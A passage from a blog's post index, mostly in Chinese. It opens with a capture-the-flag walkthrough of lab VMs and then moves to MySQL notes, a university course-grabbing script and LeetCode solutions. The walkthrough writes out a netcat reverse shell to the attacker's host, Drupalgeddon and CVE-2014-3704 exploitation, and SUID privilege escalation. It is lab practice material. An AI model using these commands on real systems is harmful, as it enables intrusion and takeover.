http://192.168.56.102/thankyou.php?file=/var/log/nginx/access.log 密码：666 获取shell再kali中监听4444端口 nc -lvvp 4444 再蚁剑的终端中执行 nc -e /bin/bash 192.168.56.101 4444 此时已经获取shell 使用python的反弹shell python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; 提权使用find命令，查找具有suid权限的命令，发现screen-4.5.0 find / -perm /4000 2 &gt; /dev/null 那么就可以查找可用于screen 4.5.0的漏洞脚本文件，再kali中查找 searchsploit screen 4.5.0 将脚本拷贝到当前工作目录 cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh cp /usr/share/exploitdb/exploits/linux/local/41152.txt 41152.txt 尝试从蚁剑上传到网站的根目录，但是发现权限不够，最后再/tmp目录上传成功 加上可执行权限即可 chmod +x 41154.sh 在kali中的shell执行 获得flag进入root目录即可获取到flag DC1环境搭建将靶机与kali放在同一网卡下实现相互通信即可 信息搜集使用 arp-scan -l netdiscover -eth0 发现目标靶机的ip地址为192.168.56.103 直接方位该ip地址，发现是可访问的网站，但是需要密码无法进入 但是很明显可以看出此网站使用的CMS为Drupal,那么就寻找与该CMS存在的漏洞即可 可以看到关于drupal 的漏洞有七个，但是我们需要选择最新的且等级为excellent的 漏洞利用这里使用的是exploit/multi/http/drupal_drupageddon use exploit/multi/http/drupal_drupageddon set RHOSTS 192.168.56.103 set LHOST 192.168.56.101 run 网站的根目录中存在一个flag1.txt，其中提示 Every good CMS needs a config file - and so do you. 那么就是找cms的配置文件，而drupal的默认配置文件位置 /var/www/sites/default/settings.php 查看此配置文件，可以看到mysql数据库的账号密码 并且出现了flag2 翻译:蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么? 交互式shell在msfconsole中获取shell后使用执行下面这句话 python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; 连接数据库 mysql -udbuser -p 密码是加密后保存到数据库的。但是在/var/www/script中发现了将密码转换为hash的脚本，可以使用脚本生成自己的密码的hash然后保存到数据库中，可惜的是该标本的环境存在问题，无法运行 百度以下drupal 密码相关的问题，发现有重置admin密码的方法 password的SHA-512加密运算的结果“$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4”； 那么就是在数据库中更新admin的密码即可 update users set pass &#x3D; &#39;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50&#x2F;kb81YI9.8M&#x2F;D9okW7J&#x2F;s5U4&#39; where name &#x3D; &#39;admin&#39;; 登录后在网站中发现了flag3 特殊的PERMS将帮助查找passwd -但您需要-exec该命令来找出如何获取阴影中的内容。 在home/flag4中看到flag4 Can you use this same method to find or access the flag in root? Probably. But perhaps it’s not that easy. Or maybe it is? 您可以使用相同的方法在根目录中查找或访问标志吗? 可能。但也许并没有那么容易。也许是这样? 使用CVE2014-3704添加管理账号 在exploit-db中有可以直接利用的EXP，可以直接添加管理账号地址：https://www.exploit-db.com/exploits/34992 在kali中开启web服务，然后再靶机中下载该exp python3 -m http.server 80 靶机端下载 wget http://192.168.56.101/34992.py 靶机端运行 python 34992.py -t http://192.168.56.103/ -u hack -p root 直接使用hack 登录 提权使用find找下具有root权限的suid find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -print 2&gt;/dev/null # 这句也可以 可以发现find命令可以用来提权 尝试使用find执行命令 find / -name flag4 -exec &quot;whoami&quot; \\; # 注意这里的-name 后的参数需要是存在的文件 这里执行的结果可以看出find是可以提权的 获取flag直接使用执行 /bin/sh find / -name flag4 -exec &quot;/bin/sh&quot; \\;","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://sunzhengyu99.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"MySql进阶学习","date":"2022-09-27T07:00:21.000Z","path":"2022/09/27/mysql/","text":"Mysql进阶学习事务 事务 是一组操作的集合，它是一个不可分割的工作单位，事务会把所有的操作作为一个整体一起向系 统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。 就比如: 张三给李四转账1000块钱，张三银行账户的钱减少1000，而李四银行账户的钱要增加 1000。 这一组操作就必须在一个事务的范围内，要么都成功，要么都失败。 数据的准备 drop table if exists account; create table account ( id int primary key AUTO_INCREMENT comment &#39;ID&#39;, name varchar(10) comment &#39;姓名&#39;, money double(10, 2) comment &#39;余额&#39; ) comment &#39;账户表&#39;; insert into account(name, money) VALUES (&#39;张三&#39;, 2000), (&#39;李四&#39;, 2000); 正常的操作下表数据的变化 select * from account; select * from account where name &#x3D; &#39;张三&#39;; update account set money &#x3D; money - 1000 where id &#x3D; 1; update account set money &#x3D; money + 1000 where id &#x3D; 2; 操作异常情况下的数据情况 update account set money &#x3D; money - 1000 where id &#x3D; 1; error update account set money &#x3D; money + 1000 where id &#x3D; 2; 在此情况下，第二句sql无法执行到 这样就会导致张三用户账户的钱少了，但是李四账号并没有收到钱，那么就会出现问题。 手动控制事务1).查看/设置事务提交方式 select @@autocommit; set @@autocommit &#x3D; 0; 2).提交事务 commit; 3).事务回滚 rollback; 上面的过程是将事务的提交设置为手动提交，此时我们执行的DML语句都不会提交, 需要手动的执行commit进行提交。 自动控制事务1).开启事务 statr&#x2F;begin tranaction 2).提交事务 commit； 3).事务回滚 rollbock; 转账案例实现 start transaction; -- 从张三账户中转出钱 update account set money &#x3D; money - 1000 where id &#x3D; 1; -- 向李四账号中转入钱 update account set money &#x3D; money + 1000 where id &#x3D; 2; -- 执行完毕，提交事务 commit; 事务四大特性 原子性（Atomicity）：事务是不可分割的最小操作单元，要么全部成功，要么全部失败。 一致性（Consistency）：事务完成时，必须使所有的数据都保持一致状态。 隔离性（Isolation）：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立 环境下运行。 持久性（Durability）：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的。 上述就是事务的四大特性，简称ACID。 并发事务产生的问题1). 赃读：一个事务读到另外一个事务还没有提交的数据 2). 不可重复读：一个事务先后读取同一条记录，但两次读取的数据不同，称之为不可重复读。 3). 幻读：一个事务按照条件查询数据时，没有对应的数据行，但是在插入数据时，又发现这行数据 已经存在，好像出现了 “幻影”。 事务的隔离级别为了解决事务并发产生的问题，在数据库中引入了事务隔离级别。主要有以下四种： 隔离级别 脏读 不可重复度 幻读 Read uncommited(读未提交) √ √ √ Read commited(读已提交) × √ √ Repeatable Read(默认) × × √ Serializable(串行化) × × × 1). 查看事务的隔离级别 SELECT @@TRANSACTION_ISOLATION; Mysql默认使用的是Repeatable Read 2).设置事务隔离级别 SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123; READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE &#125; -- session是设置当前会话即当前连接的终端的隔离级别 -- GLOBAL是设置所有会话的隔离级别 注意：事务的隔离级别越高其性能越低 存储引擎查看当前数据库支持的存储引擎 show engines 当创建表时默认使用InnoDB存储引擎 show create table tb_user; 创建数据表时指定数据引擎，添加参数engine=存储引擎名 create table my_myisam ( id int, name varchar(10) ) engine &#x3D; MyISAM; create table my_myisam ( id int, name varchar(10) ) engine &#x3D; Memory; InnoDB1). 介绍 InnoDB是一种兼顾高可靠性和高性能的通用存储引擎，在 MySQL 5.5 之后，InnoDB是默认的MySQL 存储引擎。 2). 特点 DML操作遵循ACID模型，支持事务； 行级锁，提高并发访问性能； 支持外键FOREIGN KEY约束，保证数据的完整性和正确性； 3).逻辑存储结构 MyISAM1). 介绍 MyISAM是MySQL早期的默认存储引擎。 2). 特点 不支持事务，不支持外键 支持表锁，不支持行锁 访问速度快 Memory1). 介绍 Memory引擎的表数据时存储在内存中的，由于受到硬件问题、或断电问题的影响，只能将这些表作为临时表或缓存使用。 2). 特点 内存存放 hash索引（默认） 面试题: InnoDB引擎与MyISAM引擎的区别 ? ①. InnoDB引擎, 支持事务, 而MyISAM不支持。 ②. InnoDB引擎, 支持行锁和表锁, 而MyISAM仅支持表锁, 不支持行锁。 ③. InnoDB引擎, 支持外键, 而MyISAM是不支持的。 主要是上述三点区别，当然也可以从索引结构、存储限制等方面，更加深入的回答，具体参 考如下官方文档： https://dev.mysql.com/doc/refman/8.0/en/innodb-introduction.html https://dev.mysql.com/doc/refman/8.0/en/myisam-storage-engine.html 存储引擎的选择 在选择存储引擎时，应该根据应用系统的特点选择合适的存储引擎。 InnDB:是mysql的默认存储引擎，支持事务、外键。如果应用对事务的完整性要求比较高，在并发条件下要求数据的一致性的情况下应该选择此存储引擎。 MyISAM: 如果应用是以读取和插入操作为主 ，只有少量的删除和更新操作，并且对事务的完整性，并发性要求不是很高，那么选择此存储引擎合适 Memory: 将所有数据保存在内存中， 访问速度快，通常用于临时表和缓存。但是由于存放在内存中其受到的限制也很多，如表的大小限制，无法对过大的表进行缓存，还有安全性问题，如断电时数据丢失。 索引介绍 索引（index）是帮助MySQL高效获取数据的数据结构(有序)。在数据之外，数据库系统还维护着满足 特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据， 这样就可以在这些数据结构 上实现高级查找算法，这种数据结构就是索引。 索引结构MySQL的索引是在存储引擎层实现的，不同的存储引擎有不同的索引结构，主要包含以下几种： 索引结构 描述 B+tree 最常见的索引类型，大部分引擎都支持 B+ 树索引 Hash索引 底层数据结构是用哈希表实现的, 只有精确匹配索引列的查询才有效, 不支持范围查询 R-tree(空间索引） 空间索引是MyISAM引擎的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少 Full-text(全文索引) 是一种通过建立倒排索引,快速匹配文档的方式。类似于Lucene,Solr,ES 存储引擎对于索引结构的支持情况 索引 InnoDB MyISAM Memory B+tree 支持 支持 支持 Hash索引 不支持 不支持 支持 R-tree 不支持 支持 不支持 Full-text 5.6版本之后支持 支持 不支持 B-tree B-Tree，B树是一种多叉路衡查找树，相对于二叉树，B树每个节点可以有多个分支，即多叉。以一颗最大度数（max-degree）为5(5阶)的b-tree为例，那这个B树每个节点最多存储4个key，5个指针 B+Tree B+Tree是B-Tree的变种，我们以一颗最大度数（max-degree）为4（4阶）的b+tree为例，其结构示意图： 绿色框框起来的部分，是索引部分，仅仅起到索引数据的作用，不存储数据。 红色框框起来的部分，是数据存储部分，在其叶子节点中要存储具体的数据。 B+Tree 与 B-Tree相比，主要有以下三点区别： 所有的数据都会出现在叶子节点。 叶子节点形成一个单向链表。 非叶子节点仅仅起到索引数据作用，具体的数据都是在叶子节点存放的。 MySQL索引数据结构对经典的B+Tree进行了优化。在原B+Tree的基础上，增加一个指向相邻叶子节点 的链表指针，就形成了带有顺序指针的B+Tree，提高区间访问的性能，利于排序。 Hash索引哈希索引就是采用一定的hash算法，将键值换算成新的hash值，映射到对应的槽位上，然后存储在hash表中。Java中的HashMap结构类似(树加链表的实现方式)。如果两个(或多个)键值，映射到一个相同的槽位上，他们就产生了hash冲突（也称为hash碰撞），可以通过链表来解决。 特点 Hash索引只能用于对等比较(=，in)，不支持范围查询（between，&gt;，&lt; ，…） 无法利用索引完成排序操作 查询效率高，通常(不存在hash冲突的情况)只需要一次检索就可以了，效率通常要高于B+tree索 引 为什么InnDB选择B+Tree作为索引结构 相比较二叉树，其层级更少，搜索效率更高 于B-tree，无论是叶子节点还是非叶子节点，都会保存数据，这样导致一页中存储的键值减少，指针跟着减少，要同样保存大量数据，只能增加树的高度，导致性能降低； 相对Hash索引，B+tree支持范围匹配及排序操作 索引分类在MySQL数据库，将索引的具体类型主要分为以下几类：主键索引、唯一索引、常规索引、全文索引。 分类 含义 特点 关键字 主键索引 针对表中主键创建的索引 默认自动创建，只能有一个 primary 唯一索引 避免表中某 数据列的值重复 可以有多个 UNIQUE 常规索引 快速定位数据 可以有多个 全文索引 全文索引查找的是文中的关键字，而不是比较索引的值 可以有多个 FULLTEXT 聚集索引和二级索引InnDB存储引擎中，根据索引的存储形式，又可以分为以下两种： 分类 含义 特点 聚集索引(Clustered Index) 将数据存储与索引放到一块，索引结构的叶子节点保存到行数据 必须有且只有一个 二级索引 将数据与索引分开存储，索引结构的叶子节点关联是对应的主键 可以 存放很多个 聚集索引选取规则： 如果存在主键，主键索引就是聚集索引 如果不存在主键，将使用第一个唯一(UNIQUE)索引作为聚集索引 如果表没有主键，或没有合适的唯一索引，则InnoDB会自动生成一个rowid作为隐藏的聚集索引。 聚集索引与二级索引的结构如下： 当执行 select * from user where name &#x3D; &#39;Arm&#39;; 通过二级索引获取到其对应的主键索引，再到聚集索引中获取所有的行数据，这种查询过程叫做回表查询。 上述查询详细查询过程如下： 由于是根据name字段进行查询，所以先根据name=’Arm’到name字段的二级索引中进行匹配查找。但是在二级索引中只能查找到 Arm 对应的主键值 10。 由于查询的字段是*，二级索引中没有该字段，所以此时需要根据二级索引中存储的主键id = 10去聚集索引中查询 最后获取主键为10的行，返回所有数据 InnoDB存储引擎最小的存储单元-页(16K)，那么高度为2的B+tree树能存储多少条数据？ 这里我们先假设B+树高为2，即存在一个根节点和若干个叶子节点，那么这棵B+树的存放总记录数为：根节点指针数*单个叶子节点记录行数。 上文我们已经说明单个叶子节点（页）中的记录数=16K/1K=16。（这里假设一行记录的数据大小为1k，实际上现在很多互联网业务数据记录大小通常就是1K左右）。 那么现在我们需要计算出非叶子节点能存放多少指针，其实这也很好算，我们假设主键ID为bigint类型，长度为8字节，而指针大小在InnoDB源码中设置为6字节，这样一共14字节，我们一个页中能存放多少这样的单元，其实就代表有多少指针，即16384/14=1170。那么可以算出一棵高度为2的B+树，能存放1170*16=18720条这样的数据记录。 索引语法1) 创建索引 CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name ( index_col_name,... ); 2) 查看索引 show INDEX in account; 3) 删除索引 DROP INDEX index_name ON table_name ; 索引的使用 name字段为姓名字段，该字段的值可能会重复，为该字段创建索引 CREATE INDEX idx_user_name ON tb_user(name); phone手机号字段的值，是非空，且唯一的，为该字段创建唯一索引。 CREATE UNIQUE INDEX idx_user_phone ON tb_user(phone); 为profession、age、status创建联合索引。 CREATE INDEX idx_user_profession_age_status ON tb_user(profession, age, status); 为email建立合适的索引来提升查询效率 CREATE INDEX idx_user_email ON tb_user(email); 查看表中已创建的索引 SQL性能分析SQL的执行频次SHOW GLOBAL STATUS LIKE &#39;Com_____&#39;; SHOW SESSION STATUS LIKE &#39;Com_____&#39;; 慢查询日志慢查询日志记录了所有执行时间超过指定参数（long_query_time，单位：秒，默认10秒）的所有SQL语句的日志。 MySQL的慢查询日志默认没有开启，我们可以查看一下系统变量 slow_query_log。 开启slow_query_log(默认关闭)，在mysql配置文件中添加以下配置 slow_query_log = 1 long_query_time= 2 # 当查询时间超过两秒时，会被记录 profile详情show profiles 能够在做SQL优化时帮助我们了解时间都耗费到哪里去了。通过have_profiling参数，能够看到当前MySQL是否支持profile操作： SHOW @@hava_profiling; 如果没有开启，则可以使用以下语句开启 set profiling &#x3D; 1 执行一系列的业务SQL的操作，然后通过如下指令查看指令的执行耗时： -- 查看每一条SQL的耗时基本情况 show profiles; -- 查看指定query_id的SQL语句各个阶段的耗时情况 show profile for query query_id; -- 查看指定query_id的SQL语句CPU的使用情况 show profile cpu for query query_id; 最左前缀法则如果索引了多列（联合索引），要遵守最左前缀法则。最左前缀法则指的是查询从索引的最左列开始，并且不跳过索引中的列。如果跳跃某一列，索引将会部分失效(后面的字段索引失效)。 覆盖索引尽量使用覆盖索引，减少select *。 那么什么是覆盖索引呢？ 覆盖索引是指 查询使用了索引，并且需要返回的列，在该索引中已经全部能够找到 。 使用覆盖索引可以避免回表查询，提高sql查询的效率。 索引设计原则 1). 针对于数据量较大，且查询比较频繁的表建立索引。 2). 针对于常作为查询条件（where）、排序（order by）、分组（group by）操作的字段建立索引。 3). 尽量选择区分度高的列作为索引，尽量建立唯一索引，区分度越高，使用索引的效率越高。 4). 如果是字符串类型的字段，字段的长度较长，可以针对于字段的特点，建立前缀索引。 5). 尽量使用联合索引，减少单列索引，查询时，联合索引很多时候可以覆盖索引，节省存储空间，避免回表，提高查询效率。 6). 要控制索引的数量，索引并不是多多益善，索引越多，维护索引结构的代价也就越大，会影响增删改的效率。 create unique index idx_user_phone_name on tb_user(phone,name); 7). 如果索引列不能存储NULL值，请在创建表时使用NOT NULL约束它。当优化器知道每列是否包含NULL值时，它可以更好地确定哪个索引最有效地用于查询。 SQL优化插入数据如果我们需要一次性往数据库表中插入多条记录，可以从以下三个方面进行优化。 1). 优化方案一 批量插入数据 2). 优化方案二 手动控制事务 3). 优化方案三 主键顺序插入，性能要高于乱序插入 如果一次性需要插入大批量数据(比如: 几百万的记录)，使用insert语句插入性能较低，此时可以使 用MySQL数据库提供的load指令进行插入。 -- 客户端连接服务端时，加上参数 -–local-infile mysql –-local-infile -u root -p -- 设置全局参数local_infile为1，开启从本地加载文件导入数据的开关 set global local_infile &#x3D; 1; -- 执行load指令将准备好的数据，加载到表结构中 load data local infile &#39;&#x2F;root&#x2F;sql1.log&#39; into table tb_user fields terminated by &#39;,&#39; lines terminated by &#39;\\n&#39; ; 4).主键顺序插入，性能要高于乱序插入 主键优化 满足业务需求的情况下，尽量降低主键的长度。 插入数据时，尽量选择顺序插入，选择使用AUTO_INCREMENT自增主键。 尽量不要使用UUID做主键或者是其他自然主键，如身份证号。 业务操作时，避免对主键的修改。 order by优化MySQL的排序，有两种方式： Using filesort : 通过表的索引或全表扫描，读取满足条件的数据行，然后在排序缓冲区sortbuffer中完成排序操作，所有不是通过索引直接返回排序结果的排序都叫 FileSort 排序。 Using index : 通过有序索引顺序扫描直接返回有序数据，这种情况即为 using index，不需要额外排序，操作效率高。 对于以上的两种排序方式，Using index的性能高，而Using filesort的性能低，我们在优化排序操作时，尽量要优化为 Using index。 order by优化原则: A. 根据排序字段建立合适的索引，多字段排序时，也遵循最左前缀法则。 B. 尽量使用覆盖索引。 C. 多字段排序, 一个升序一个降序，此时需要注意联合索引在创建时的规则（ASC/DESC）。 D. 如果不可避免的出现filesort，大数据量排序时，可以适当增大排序缓冲区大小 sort_buffer_size(默认256k)。 group by优化在分组操作中，我们需要通过以下两点进行优化，以提升性能： A. 在分组操作时，可以通过索引来提高效率。 B. 分组操作时，索引的使用也是满足最左前缀法则的。 limit优化优化思路: 一般分页查询时，通过创建 覆盖索引 能够比较好地提高性能，可以通过覆盖索引加子查询形式进行优化。 count优化count的工作原理 MyISAM 引擎把一个表的总行数存在了磁盘上，因此执行 count(*) 的时候会直接返回这个数，效率很高； 但是如果是带条件的count，MyISAM也慢。 InnoDB 引擎就麻烦了，它执行 count(*) 的时候，需要把数据一行一行地从引擎里面读出来，然后累积计数。 count的用法 count() 是一个聚合函数，对于返回的结果集，一行行地判断，如果 count 函数的参数不是NULL，累计值就加 1，否则不加，最后返回累计值。 用法：count（*）、count（主键）、count（字段）、count（数字） count用法 含义 count(主键) InnoDB 引擎会遍历整张表，把每一行的 主键id 值都取出来，返回给服务层。服务层拿到主键后，直接按行进行累加(主键不可能为null)。 count(*) 没有not null 约束: InnoDB 引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，服务层判断是否为null，不为null，计数累加。有not null 约束: InnoDB引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，直接按行进行累加。 count(字段) InnoDB 引擎遍历整张表，但不取值。服务层对于返回的每一行，放一个数字’1’进去，直接按行进行累加。 count(数字) InnoDB引擎并不会把全部字段取出来，而是专门做了优化，不取值，服务层直接按行累加。 按照效率排序的话，count(字段) &lt; count(主键 id) &lt; count(1) ≈ count()，所以尽量使用 count(\\)。","tags":[{"name":"mysql","slug":"mysql","permalink":"https://sunzhengyu99.github.io/tags/mysql/"}]},{"title":"XDU_choose_course","date":"2022-09-09T04:59:12.000Z","path":"2022/09/09/XDU-choose-course/","text":"XDU 抢课脚本项目地址 1.登录认证1.1 密码加密首先在浏览器中在同一身份的位置进行手动登录可以发现如下的请求 输入的密码已经被加密 表单参数中多了一个execution参数 在浏览器拦截的请求中有一个encrypt.js的文件，猜测是用于加密密码的 该文件的代码很长，但是核心的加密过程如下 function getAesString(data, key0, iv0) &#123; key0 = key0.replace(/(^\\s+)|(\\s+$)/g, &quot;&quot;); var key = CryptoJS.enc.Utf8.parse(key0); var iv = CryptoJS.enc.Utf8.parse(iv0); var encrypted = CryptoJS.AES.encrypt(data, key, &#123; iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 &#125;); return encrypted.toString(); &#125; function encryptAES(data, aesKey) &#123; if (!aesKey) &#123; return data; &#125; var encrypted = getAesString( randomString(64) + data, aesKey, randomString(16) ); return encrypted; &#125; function encryptPassword(pwd0, key) &#123; try &#123; return encryptAES(pwd0, key); &#125; catch (e) &#123;&#125; return pwd0; &#125; var $aes_chars = &quot;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&quot;; var aes_chars_len = $aes_chars.length; function randomString(len) &#123; var retStr = &quot;&quot;; for (i = 0; i &lt; len; i++) &#123; retStr += $aes_chars.charAt(Math.floor(Math.random() * aes_chars_len)); &#125; return retStr; &#125; 可以看出使用的时AES的CBC模式进行加密，而AES在加密时需要一个密钥，这个密钥应该是隐藏在前端页面中，每次刷新都会更新。 果然在前端页面中可以找到pwdEncryptSalt字段，并把execution字段也找了出来 下面就是写出AES加密的脚本(fe1w0写的) def encryptPassword(password, key): # password 加密, 该段代码参考于 https://github.com/EdenLin-c/CPdaily/blob/master/Jin.py def randomString(len): retStr = &#x27;&#x27; i=0 while i &lt; len: retStr += aes_chars[(math.floor(random.random() * aes_chars_len))] i=i+1 return retStr def getAesString(data,key,iv): key = re.sub(&#x27;/(^\\s+)|(\\s+$)/g&#x27;, &#x27;&#x27;, key) aes = AES.new(str.encode(key),AES.MODE_CBC,str.encode(iv)) pad_pkcs7 = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size, style=&#x27;pkcs7&#x27;) encrypted =aes.encrypt(pad_pkcs7) return str(base64.b64encode(encrypted),&#x27;utf-8&#x27;) aes_chars = &#x27;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&#x27; aes_chars_len = len(aes_chars) encrypted = getAesString(randomString(64) + password, key, randomString(16)) return encrypted 1.2 获取session下面就是使用requese获取登录的session 设置请求头 headers = &#123; &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;, &#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;, &#x27;Content-Length&#x27;: &#x27;154&#x27;, &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#x27;Host&#x27;: &#x27;ids.xidian.edu.cn&#x27;, &#x27;Origin&#x27;: &#x27;http://ids.xidian.edu.cn&#x27;, &#x27;Referer&#x27;: &#x27;http://ids.xidian.edu.cn/authserver/login&#x27;, &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;, &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36&#x27;, &#125; 获取前端页面的pwdEncryptSalt字段和execution字段，并对密码进行加密 session_client = requests.Session() requests.packages.urllib3.disable_warnings() response = session_client.get(&quot;https://ids.xidian.edu.cn/authserver/login&quot;) parse_html = etree.HTML(response.text) pwdEncryptSalt = parse_html.xpath(&#x27;//div//input[@id=&quot;pwdEncryptSalt&quot;]//@value&#x27;)[0] execution = parse_html.xpath(&#x27;//div//input[@id=&quot;execution&quot;]//@value&#x27;)[0] encrypt_passwrod = encryptPassword(password, pwdEncryptSalt) 设置post请求参数 post_data = &#123; &quot;username&quot;: user_id, &quot;password&quot;: encrypt_passwrod, &quot;captcha&quot;: None, &quot;_eventId&quot;: &quot;submit&quot;, &quot;cllt&quot;: &quot;userNameLogin&quot;, &quot;dllt&quot;: &quot;generalLogin&quot;, &quot;lt&quot;: None, &quot;execution&quot;: execution &#125; sso_response = session_client.post(&quot;https://ids.xidian.edu.cn/authserver/login&quot;, headers=headers, data=post_data,verify=False) 2.获取课程列表进入选课平台后，能够看到https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.do这样一条请求，查看数可知，是加载计划内选课的api 再仔细看拦截的请求，可以看到很多请求参数 第一个就是查询关键字参数，即将想抢课的课程代码或课程名放到此处即可获取到相应的课程信息。 def getCourseInfo(session_client, course_KCDM): &quot;&quot;&quot; 获取指定课程的详细信息 :param session_client: :param course_KCDM: :return: &quot;&quot;&quot; # course_KCDM = &quot;&quot; course_infos = session_client.post(&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.do?query_keyword=&quot; + course_KCDM, verify = False) course_json = json.loads(course_infos.text)[&quot;datas&quot;] if len(course_json) == 0: return None course_info = &quot;&quot; for course in course_json: if course_KCDM == course[&quot;KCDM&quot;]: course_info = course break return course_info 3.监控容量并抢课3.1 选课函数获取课程信息后，只要判断课程的容量与当前的选课人数的关系即可进行选课。点击选课按钮，发送的请求如下，可以看到加入csrfToken，那么就想办法找到它就能进行选课了。 在刷新选课页面时，会出现https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.do，其返回的数据中就包含了csrfToken def chooseCourse(course_BJDM): &quot;&quot;&quot; 选课函数，根据course_BJDM进行选课 :param course_BJDM: :return: &quot;&quot;&quot; csrf_token_url = &quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.do&quot; csrf_response = session_client.get(csrf_token_url).text json_csrf_res = json.loads(csrf_response) csrf_token = json_csrf_res.get(&quot;csrfToken&quot;) choose_course_url = &quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/choiceCourse.do?bjdm=&#123;0&#125;&amp;csrfToken=&#123;1&#125;&amp;lx=0&quot;.format(course_BJDM, csrf_token) choose_response = session_client.get(choose_course_url, verify = False).text # print(choose_response) return json.loads(choose_response)[&quot;code&quot;] 3.2 监控容量并抢课为了防止登录的session过期可以设置一个定时任务，每个十二小时启动一次该脚本。 if __name__ == &#x27;__main__&#x27;: KCDM = course_KCDM session_client = getSession() course_info = getCourseInfo(session_client = session_client, course_KCDM = KCDM) if course_info == None: print(&quot;[+] 未查询到课程信息，请检查课程代码！&quot;) quit() course_KXRS = course_info[&quot;KXRS&quot;] # 课程总容量 course_DQRS = course_info[&quot;DQRS&quot;] # 当前选课人数 while True: if course_DQRS &lt; course_KXRS: course_BJDM = course_info[&quot;BJDM&quot;] code = chooseCourse(course_BJDM) if code == 1: print(&quot;[+] 选课成功!&quot;) print(&quot;[+] 课程信息如下:&quot;) printCourseInfo(course_info) quit() else: print(&quot;[+] 选课失败!&quot;) else: print(&quot;[+] 当前课程容量已满!&quot;) time.sleep(sleep_time) # 每60s查询一次 continue # 监控选课人数的变化 course_info = getCourseInfo(session_client=session_client, course_KCDM = KCDM) course_KXRS = course_info[&quot;KXRS&quot;] # 课程总容量 course_DQRS = course_info[&quot;DQRS&quot;] # 当前选课人数 print(&quot;[+] Finish&quot;)","tags":[]},{"title":"Daily_Algorithm","date":"2022-07-29T05:08:13.000Z","path":"2022/07/29/Daily-Algorithm/","text":"每日刷题leetcode每日刷题，先定个小目标300 项目地址 高级算法分析与设计课程作业作业一两数之和（力扣第1题） 给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。 你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。 示例: 给定 nums = [2, 7, 11, 15], target = 9 因为 nums[0] + nums[1] = 2 + 7 = 9 所以返回 [0, 1] 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/two-sum 思路一：暴力，二重循环搜索答案，肯定超时 思路二：使用hash表，将遍历过的数据放入hash表中，&lt;key , value&gt; 为&lt;nums[i], i&gt;结构 public int[] twoSum(int[] nums, int target) &#123; HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; if(map.containsKey(target - nums[i]))&#123; return new int[]&#123;map.get(target - nums[i]), i&#125;; &#125; map.put(nums[i], i); &#125; return null; &#125; 最大子序和（力扣53题） 给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。 示例: 输入: [-2,1,-3,4,-1,2,1,-5,4], 输出: 6 解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/maximum-subarray 思路：动态规划 创建dp数组，dp[i]表示遍历到i时，第 i个数结尾的 连续子数组的最大和 动态转移方程 dp[i] = max(dp[i - 1] + nums[i], nums[i]); 初始化dp dp[0] = nums[0] 遍历顺序为从前向后 public int maxSubArray(int[] nums) &#123; // int sum = nums[0]; // int[] dp = new int[nums.length]; // dp[0] = nums[0]; // for (int i = 1; i &lt; nums.length; i++) &#123; // dp[i] = Math.max(dp[i-1] + nums[i], nums[i]); // if(dp[i] &gt; sum)&#123; // sum = dp[i]; // &#125; // &#125; // return sum; // 可以不使用dp数组，节省空间 int sum = nums[0]; int result = sum; for (int i = 1; i &lt; nums.length; i++) &#123; sum = Math.max(sum + nums[i], nums[i]); if(sum &gt; result)&#123; result = sum; &#125; &#125; return result; &#125; 多数元素（力扣169题） 给定一个大小为 n 的数组，找到其中的多数元素。多数元素是指在数组中出现次数大于 ⌊ n/2 ⌋ 的元素。 